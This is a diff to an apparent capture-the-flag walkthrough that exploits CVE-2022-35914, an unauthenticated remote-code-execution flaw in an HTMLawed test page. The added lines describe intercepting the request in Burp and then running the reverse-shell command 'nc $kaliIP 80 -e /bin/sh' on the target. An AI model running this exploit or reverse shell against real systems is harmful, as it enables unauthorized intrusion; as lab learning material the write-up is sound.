@@ -43,5 +43,11 @@ But the above one didn't work. So we started looking for other exploits.
 ![[Law3.png]]
 It seems like an HTMLawed 1.2.5 test version. There appears to be an exploit for this CVE-2022–35914, a GLPI unauthenticated RCE where you just need to change the hook to ‘exec’, and then you will get immediate code execution. You can learn how to exploit it here:
 To reproduce the exploit I did the following :
-launched burp suite
-
+launched burp suite.
+Checking the browser network tab, we discovered the POST request sent to `[http://$ip/htmLawedTest.php](http://$ip/htmLawedTest.php)` where our page is supposed to be `[http://$ip](http://$ip./)` , to ease up the thing, we decide to use burp to intercept the traffic, and correct the POST request.
+![[Pasted image 20260310164235.png]]
+Remove the htmLawedTest.php and click forward.
+![[Pasted image 20260310164407.png]]
+![[Pasted image 20260310164423.png]]
+And here we go, setup a netcat listener on our kali machine and execute `nc $kaliIP 80 -e /bin/sh` on the target machine to get us a reverse shell. Sometimes the page just does not work, try refresh and it should work.
+![[Pasted image 20260310164645.png]]
